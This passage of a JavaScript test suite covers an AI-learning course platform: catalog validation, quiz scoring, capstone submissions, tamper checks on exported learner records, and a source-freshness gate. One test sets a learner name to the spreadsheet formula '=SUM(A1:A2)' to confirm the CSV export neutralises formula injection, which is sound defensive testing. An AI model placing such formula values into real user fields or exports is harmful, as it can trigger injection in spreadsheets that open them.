  module.instructorScript.captions[2].text = "Text that differs from its cue.";
  module.instructorScript.reducedMotionAlternative = "";

  const validation = validateCatalog(broken);
  assert.equal(validation.valid, false);
  assert.ok(
    validation.errors.includes(
      "Module context-engineering instructor script has an invalid caption",
    ),
  );
  assert.ok(
    validation.errors.includes(
      "Module context-engineering instructor script needs a reduced-motion alternative",
    ),
  );
  assert.ok(
    validation.errors.includes(
      "Module context-engineering caption references missing cue missing-cue",
    ),
  );
  assert.ok(
    validation.errors.some((error) =>
      error.startsWith("Module context-engineering caption text differs from cue"),
    ),
  );
  assert.ok(
    validation.errors.some((error) =>
      error.startsWith("Module context-engineering transcript is missing narration cue"),
    ),
  );
});

test("rejects incomplete or unsourced provider comparison cells", () => {
  const broken = structuredClone(starterCatalog);
  const module = broken.modules.find(
    (candidate) => candidate.id === "compare-provider-capabilities",
  );
  assert.ok(module?.comparisonMatrix);
  module.comparisonMatrix.asOf = "whenever";
  module.comparisonMatrix.dimensions[0].providers.anthropic.sourceUrls = [
    "https://example.com/unsupported",
  ];
  module.comparisonMatrix.dimensions[1].providers.openai.summary = "";

  const validation = validateCatalog(broken);
  assert.equal(validation.valid, false);
  assert.ok(
    validation.errors.includes(
      "Module compare-provider-capabilities comparison matrix has an invalid asOf date",
    ),
  );
  assert.ok(
    validation.errors.includes(
      "Module compare-provider-capabilities comparison dimension provider-interfaces references an undeclared source: https://example.com/unsupported",
    ),
  );
  assert.ok(
    validation.errors.includes(
      "Module compare-provider-capabilities comparison dimension api-request-response has an incomplete openai cell",
    ),
  );
});

test("catalog validation catches broken references and unsafe source metadata", () => {
  const broken = structuredClone(starterCatalog);
  const whatAiDoes = broken.modules.find((module) => module.id === "what-ai-does");
  const promptWithPurpose = broken.modules.find(
    (module) => module.id === "prompt-with-purpose",
  );
  assert.ok(whatAiDoes);
  assert.ok(promptWithPurpose);
  broken.paths[0].moduleIds.push("missing-module");
  whatAiDoes.providers = [];
  whatAiDoes.sources[0].url = "http://example.com/source";
  whatAiDoes.sections.push(structuredClone(whatAiDoes.sections[0]));
  whatAiDoes.prerequisites = ["prompt-with-purpose"];
  broken.resources[0].lastVerified = "next Thursday";
  promptWithPurpose.prerequisites = ["what-ai-does"];

  const validation = validateCatalog(broken);
  assert.equal(validation.valid, false);
  assert.ok(
    validation.errors.includes(
      "Path ai-foundations references missing module missing-module",
    ),
  );
  assert.ok(validation.errors.includes("Module what-ai-does has no providers"));
  assert.ok(
    validation.errors.includes(
      "Module what-ai-does source must use HTTPS: http://example.com/source",
    ),
  );
  assert.ok(
    validation.errors.includes(
      "Resource ai-glossary has an invalid lastVerified date",
    ),
  );
  assert.ok(
    validation.errors.includes(
      "Module what-ai-does has duplicate section id ai-mental-model",
    ),
  );
  assert.ok(
    validation.errors.includes(
      "Prerequisite cycle includes module prompt-with-purpose",
    ),
  );
});

test("scores a knowledge check and returns explanations", () => {
  const module = starterCatalog.modules[0];
  const answers = Object.fromEntries(
    module.knowledgeCheck.questions.map((question) => [question.id, question.answerIndex]),
  );
  const result = scoreKnowledgeCheck(
    module.knowledgeCheck.questions,
    answers,
    module.knowledgeCheck.passPercent,
  );

  assert.equal(result.scorePercent, 100);
  assert.equal(result.passed, true);
  assert.equal(result.feedback.length, module.knowledgeCheck.questions.length);
});

test("records attempts idempotently and builds a transcript", () => {
  const path = starterCatalog.paths[0];
  const module = starterCatalog.modules.find((candidate) => candidate.id === path.moduleIds[0]);
  assert.ok(module);
  const result = scoreKnowledgeCheck(
    module.knowledgeCheck.questions,
    Object.fromEntries(
      module.knowledgeCheck.questions.map((question) => [question.id, question.answerIndex]),
    ),
  );
  const input = {
    attemptId: "attempt-1",
    pathId: path.id,
    moduleId: module.id,
    completedAt: "2026-07-23T12:00:00.000Z",
    result,
  };
  const once = recordAssessmentAttempt(createEmptyProgress(), starterCatalog, input);
  const twice = recordAssessmentAttempt(once, starterCatalog, input);
  const transcript = buildTranscript(starterCatalog, twice);
  const history = buildAssessmentHistory(starterCatalog, twice);

  assert.equal(twice.attempts.length, 1);
  assert.deepEqual(twice.completedModuleIds, [module.id]);
  assert.equal(transcript[0].completedModules, 1);
  assert.equal(history.length, 1);
  assert.equal(history[0].moduleTitle, module.title);
  assert.equal(history[0].scorePercent, 100);
  assert.equal(history[0].passed, true);
});

test("records a recent module visit without completing the lesson", () => {
  const path = starterCatalog.paths[0];
  const moduleId = path.moduleIds[0];
  const visited = recordModuleVisit(createEmptyProgress(), starterCatalog, {
    pathId: path.id,
    moduleId,
    visitedAt: "2026-07-23T13:00:00.000Z",
  });

  assert.deepEqual(visited.startedPathIds, [path.id]);
  assert.deepEqual(visited.completedModuleIds, []);
  assert.deepEqual(visited.recentModule, {
    pathId: path.id,
    moduleId,
    visitedAt: "2026-07-23T13:00:00.000Z",
  });
  assert.throws(
    () =>
      recordModuleVisit(visited, starterCatalog, {
        pathId: path.id,
        moduleId: "not-in-this-path",
        visitedAt: "2026-07-23T13:01:00.000Z",
      }),
    /does not belong/,
  );
});

test("requires both a passing check and traceable capstone evidence", () => {
  const path = starterCatalog.paths.find(
    (candidate) => candidate.id === "ai-foundations",
  );
  const module = starterCatalog.modules.find(
    (candidate) => candidate.id === "ai-foundations-capstone",
  );
  assert.ok(path);
  assert.ok(module?.capstone);
  const result = scoreKnowledgeCheck(
    module.knowledgeCheck.questions,
    Object.fromEntries(
      module.knowledgeCheck.questions.map((question) => [
        question.id,
        question.answerIndex,
      ]),
    ),
    module.knowledgeCheck.passPercent,
  );
  const afterCheck = recordAssessmentAttempt(
    createEmptyProgress("Capstone learner"),
    starterCatalog,
    {
      attemptId: "attempt-capstone-check",
      pathId: path.id,
      moduleId: module.id,
      completedAt: "2026-07-25T12:00:00.000Z",
      result,
    },
  );
  assert.equal(afterCheck.completedModuleIds.includes(module.id), false);

  const input = {
    submissionId: "submission-capstone-1",
    pathId: path.id,
    moduleId: module.id,
    submittedAt: "2026-07-25T12:30:00.000Z",
    artifactRefs: [
      "portfolio/objective.md",
      "portfolio/workflow.md",
      "portfolio/evidence.md",
      "portfolio/verification.md",
      "portfolio/handoff.md",
    ],
    criterionScores: module.capstone.rubric.criteria.map((criterion) => ({
      criterionId: criterion.id,
      pointsAwarded: criterion.maxPoints,
    })),
    reflection: "Independent checks changed the final recommendation.",
  };
  const completed = recordCapstoneSubmission(
    afterCheck,
    starterCatalog,
    input,
  );
  const idempotent = recordCapstoneSubmission(
    completed,
    starterCatalog,
    input,
  );
  const history = buildCapstoneHistory(starterCatalog, idempotent);
  const csv = buildTranscriptCsv(starterCatalog, idempotent);

  assert.deepEqual(completed.completedModuleIds, [module.id]);
  assert.equal(idempotent.capstoneSubmissions.length, 1);
  assert.equal(history.length, 1);
  assert.equal(history[0].capstoneTitle, module.capstone.title);
  assert.equal(history[0].scorePercent, 100);
  assert.equal(history[0].passed, true);
  assert.match(csv, /Capstone/);
  assert.match(csv, /submission-capstone-1/);
  assert.match(csv, /portfolio\/objective\.md/);

  const record = buildPortableLearnerRecord(
    starterCatalog,
    idempotent,
    "2026-07-25T13:00:00.000Z",
  );
  assert.deepEqual(restorePortableLearnerRecord(record, starterCatalog), {
    valid: true,
    progress: idempotent,
  });

  const capstoneFirst = recordCapstoneSubmission(
    createEmptyProgress("Capstone first"),
    starterCatalog,
    { ...input, submissionId: "submission-capstone-first" },
  );
  assert.equal(capstoneFirst.completedModuleIds.includes(module.id), false);
  const completedAfterCheck = recordAssessmentAttempt(
    capstoneFirst,
    starterCatalog,
    {
      attemptId: "attempt-after-capstone",
      pathId: path.id,
      moduleId: module.id,
      completedAt: "2026-07-25T13:15:00.000Z",
      result,
    },
  );
  assert.equal(completedAfterCheck.completedModuleIds.includes(module.id), true);

  const tampered = structuredClone(record);
  tampered.learner.capstoneSubmissions[0].scorePercent = 99;
  const rejected = restorePortableLearnerRecord(tampered, starterCatalog);
  assert.equal(rejected.valid, false);
  assert.ok(
    rejected.errors.some((error) => error.includes("inconsistent score")),
  );
});

test("rejects capstone submissions with missing artifacts or invalid scores", () => {
  const path = starterCatalog.paths.find(
    (candidate) => candidate.id === "ai-foundations",
  );
  const module = starterCatalog.modules.find(
    (candidate) => candidate.id === "ai-foundations-capstone",
  );
  assert.ok(path);
  assert.ok(module?.capstone);
  const base = {
    submissionId: "submission-invalid",
    pathId: path.id,
    moduleId: module.id,
    submittedAt: "2026-07-25T12:30:00.000Z",
    artifactRefs: ["only-one-artifact.md"],
    criterionScores: module.capstone.rubric.criteria.map((criterion) => ({
      criterionId: criterion.id,
      pointsAwarded: criterion.maxPoints,
    })),
    reflection: "A reflection.",
  };

  assert.throws(
    () => recordCapstoneSubmission(createEmptyProgress(), starterCatalog, base),
    /at least 5 artifact references/,
  );
  assert.throws(
    () =>
      recordCapstoneSubmission(createEmptyProgress(), starterCatalog, {
        ...base,
        artifactRefs: ["a", "b", "c", "d", "e"],
        criterionScores: base.criterionScores.map((score, index) => ({
          ...score,
          pointsAwarded: index === 0 ? 21 : score.pointsAwarded,
        })),
      }),
    /Invalid score/,
  );
});

test("requires reliable-capstone criterion evidence and preserves revisions", () => {
  const path = starterCatalog.paths.find(
    (candidate) => candidate.id === "reliable-agent-workflows",
  );
  const module = starterCatalog.modules.find(
    (candidate) => candidate.id === "reliable-agent-capstone",
  );
  assert.ok(path);
  assert.ok(module?.capstone);

  const result = scoreKnowledgeCheck(
    module.knowledgeCheck.questions,
    Object.fromEntries(
      module.knowledgeCheck.questions.map((question) => [
        question.id,
        question.answerIndex,
      ]),
    ),
    module.knowledgeCheck.passPercent,
  );
  const afterCheck = recordAssessmentAttempt(
    createEmptyProgress("Agent operator"),
    starterCatalog,
    {
      attemptId: "attempt-reliable-capstone-check",
      pathId: path.id,
      moduleId: module.id,
      completedAt: "2026-07-25T15:00:00.000Z",
      result,
    },
  );
  const artifactRefs = module.capstone.requiredArtifacts.map(
    (artifact) => `portfolio/${artifact}`,
  );
  const unlinkedScores = module.capstone.rubric.criteria.map((criterion) => ({
    criterionId: criterion.id,
    pointsAwarded: criterion.maxPoints,
  }));
  const base = {
    pathId: path.id,
    moduleId: module.id,
    artifactRefs,
    reflection: "Failure testing added reconciliation before retry.",
  };

  assert.throws(
    () =>
      recordCapstoneSubmission(afterCheck, starterCatalog, {
        ...base,
        submissionId: "submission-reliable-unlinked",
        submittedAt: "2026-07-25T15:30:00.000Z",
        criterionScores: unlinkedScores,
      }),
    /needs mapped artifact or assessment evidence/,
  );

  const failed = recordCapstoneSubmission(afterCheck, starterCatalog, {
    ...base,
    submissionId: "submission-reliable-failed",
    submittedAt: "2026-07-25T15:40:00.000Z",
    criterionScores: module.capstone.rubric.criteria.map((criterion, index) => ({
      criterionId: criterion.id,
      pointsAwarded: index < 2 ? 0 : criterion.maxPoints,
      evidenceRefs: [
        artifactRefs[index],
        "assessment:attempt-reliable-capstone-check",
      ],
    })),
  });
  assert.equal(failed.completedModuleIds.includes(module.id), false);
  assert.equal(failed.capstoneSubmissions.length, 1);

  const passed = recordCapstoneSubmission(failed, starterCatalog, {
    ...base,
    submissionId: "submission-reliable-revised",
    submittedAt: "2026-07-25T16:00:00.000Z",
    criterionScores: module.capstone.rubric.criteria.map((criterion, index) => ({
      criterionId: criterion.id,
      pointsAwarded: criterion.maxPoints,
      evidenceRefs: [
        artifactRefs[index],
        "assessment:attempt-reliable-capstone-check",
      ],
    })),
  });
  assert.equal(passed.completedModuleIds.includes(module.id), true);
  assert.equal(passed.capstoneSubmissions.length, 2);
  assert.equal(passed.badges.some((badge) => badge.id === path.badge.id), false);

  const record = buildPortableLearnerRecord(starterCatalog, passed);
  assert.deepEqual(restorePortableLearnerRecord(record, starterCatalog), {
    valid: true,
    progress: passed,
  });
  const csv = buildTranscriptCsv(starterCatalog, passed);
  assert.match(csv, /Criterion evidence/);
  assert.match(csv, /assessment:attempt-reliable-capstone-check/);

  const tampered = structuredClone(record);
  tampered.learner.capstoneSubmissions[1].criterionScores[0].evidenceRefs = [
    "not-submitted.md",
  ];
  const rejected = restorePortableLearnerRecord(tampered, starterCatalog);
  assert.equal(rejected.valid, false);
  assert.ok(
    rejected.errors.some((error) =>
      error.includes("unmapped criterion evidence"),
    ),
  );
});

test("exports a portable learner record and spreadsheet-safe transcript", () => {
  const progress = {
    ...createEmptyProgress("=SUM(A1:A2)"),
    updatedAt: "2026-07-23T12:00:00.000Z",
  };
  const record = buildPortableLearnerRecord(
    starterCatalog,
    progress,
    "2026-07-23T12:30:00.000Z",
  );
  const csv = buildTranscriptCsv(starterCatalog, progress);

  assert.deepEqual(validatePortableLearnerRecord(record), { valid: true, errors: [] });
  assert.equal(record.catalogVersion, starterCatalog.contentVersion);
  assert.equal(record.transcript.length, starterCatalog.paths.length);
  assert.match(csv, /Path,Module,Completed modules/);
  assert.match(csv, /AI Foundations/);
  assert.deepEqual(restorePortableLearnerRecord(record, starterCatalog), {
    valid: true,
    progress,
  });
});

test("exports individual assessment attempts in the transcript CSV", () => {
  const path = starterCatalog.paths[0];
  const module = starterCatalog.modules.find(
    (candidate) => candidate.id === path.moduleIds[0],
  );
  assert.ok(module);
  const result = scoreKnowledgeCheck(
    module.knowledgeCheck.questions,
    Object.fromEntries(
      module.knowledgeCheck.questions.map((question) => [
        question.id,
        question.answerIndex,
      ]),
    ),
    module.knowledgeCheck.passPercent,
  );
  const progress = recordAssessmentAttempt(createEmptyProgress(), starterCatalog, {
    attemptId: "attempt-csv",
    pathId: path.id,
    moduleId: module.id,
    completedAt: "2026-07-23T12:00:00.000Z",
    result,
  });
  const csv = buildTranscriptCsv(starterCatalog, progress);

  assert.ok(csv.includes(module.title));
  assert.ok(
    csv.includes(
      `2026-07-23T12:00:00.000Z,100,Yes,${starterCatalog.contentVersion}`,
    ),
  );
});

test("rejects incompatible learner-record exports", () => {
  assert.deepEqual(
    validatePortableLearnerRecord({
      format: "another-product",
      formatVersion: "9",
      exportedAt: "not-a-date",
      catalogVersion: "",
      learner: null,
      transcript: null,
    }),
    {
      valid: false,
      errors: [
        "Unsupported learner-record format",
        "Unsupported learner-record version",
        "exportedAt must be an ISO date",
        "catalogVersion is required",
        "learner is not a valid version 1 progress record",
        "transcript must be an array of valid path summaries",
      ],
    },
  );
});

test("rejects unsafe learner records and accepts compatible older catalogs", () => {
  const record = buildPortableLearnerRecord(
    starterCatalog,
    createEmptyProgress(),
    "2026-07-23T12:30:00.000Z",
  );
  record.learner.attempts.push({
    id: "unknown-attempt",
    pathId: "unknown-path",
    moduleId: "unknown-module",
    contentVersion: starterCatalog.contentVersion,
    scorePercent: 100,
    passed: true,
    completedAt: "2026-07-23T12:00:00.000Z",
  });

  const result = restorePortableLearnerRecord(record, starterCatalog);
  assert.equal(result.valid, false);
  assert.ok(result.errors.some((error) => error.includes("unknown path")));
  assert.ok(result.errors.some((error) => error.includes("unknown module")));

  const compatibleOlderRecord = buildPortableLearnerRecord(
    starterCatalog,
    createEmptyProgress(),
    "2026-07-23T12:30:00.000Z",
  );
  compatibleOlderRecord.catalogVersion = "0.0.1";
  delete compatibleOlderRecord.learner.capstoneSubmissions;
  const restoredOlderRecord = restorePortableLearnerRecord(
    compatibleOlderRecord,
    starterCatalog,
  );
  assert.equal(
    restoredOlderRecord.valid,
    true,
  );
  assert.deepEqual(restoredOlderRecord.progress.capstoneSubmissions, []);

  const malformed = buildPortableLearnerRecord(
    starterCatalog,
    createEmptyProgress(),
    "2026-07-23T12:30:00.000Z",
  );
  malformed.learner.displayName = "x".repeat(81);
  assert.deepEqual(validatePortableLearnerRecord(malformed), {
    valid: false,
    errors: ["learner is not a valid version 1 progress record"],
  });
});

test("content freshness gate passes current sources and rejects stale ones", () => {
  const current = runFreshnessCheck("2026-07-23");
  const stale = runFreshnessCheck("2027-07-23");

  assert.equal(current.status, 0, current.stderr);
  const expectedReferenceCount =
    starterCatalog.modules.reduce(
      (total, module) => total + module.sources.length,
      0,
    ) +
    starterCatalog.resources.reduce(
      (total, resource) => total + resource.sources.length,
      0,
    );
  assert.match(
    current.stdout,
    new RegExp(`Checked ${expectedReferenceCount} references`),
  );
  assert.equal(stale.status, 1);
  assert.match(stale.stderr, /ERROR .* is \d+ days old/);
});

function runFreshnessCheck(asOf) {
  return spawnSync(process.execPath, ["scripts/check-freshness.mjs"], {
    cwd: process.cwd(),
    encoding: "utf8",
    env: { ...process.env, PROJECT42_AS_OF: asOf },
  });
}
